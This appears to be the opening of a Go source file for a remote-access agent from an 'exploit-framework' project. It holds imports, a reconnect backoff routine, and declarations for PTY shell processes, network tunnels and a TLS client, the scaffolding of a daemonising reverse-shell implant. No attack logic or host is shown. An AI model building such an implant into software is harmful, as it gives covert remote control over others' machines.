package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"


	"github.com/krishpranav/exploit-framework/lib/util/crypto"
	"github.com/krishpranav/exploit-framework/lib/util/hash"
	"github.com/krishpranav/exploit-framework/lib/util/log"
	"github.com/krishpranav/exploit-framework/lib/util/message"

	"github.com/creack/pty"
	"github.com/sevlyar/go-daemon"
)

type Backoff struct {
	Current int64
	Unit    time.Duration
	Max     int64
}

func (b *Backoff) Reset() {
	b.Current = 1
}

func (b *Backoff) increase() {
	b.Current <<= 1
	if b.Current > b.Max {
		b.Reset()
	}
}

func (b *Backoff) Sleep(add int64) {
	var i int64 = 0
	for i < b.Current+add {
		time.Sleep(b.Unit)
		i++
	}
	b.increase()
}

func CreateBackOff() *Backoff {
	backoff := &Backoff{
		Unit: time.Second,
		Max:  0x100,
	}
	backoff.Reset()
	return backoff
}

var backoff *Backoff

type TermiteProcess struct {
	ptmx       *os.File
	windowSize *pty.Winsize
	process    *exec.Cmd
}

var processes map[string]*TermiteProcess

var tunnels map[string]*net.Conn

type Client struct {
	Conn    *tls.Conn
	Encoder *gob.Encoder
	Decoder *gob.Decoder
}